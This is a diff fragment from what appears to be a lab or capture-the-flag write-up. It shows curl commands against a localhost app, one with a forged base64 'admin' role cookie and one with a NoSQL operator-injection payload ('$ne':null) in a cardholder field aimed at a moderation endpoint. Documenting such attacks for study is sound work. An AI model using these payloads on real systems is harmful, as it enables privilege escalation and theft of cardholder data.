@@ -112,7 +112,7 @@ curl "http://localhost:8000/admin/reports?u=alice" -b "role=YWRtaW4="
 ```bash
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d 'cardholder={"$ne":null}' \
+  -d 'cardholder={"cardholder":{"$ne":null}}' \
   -b "role=YWRtaW4="
 ```
 
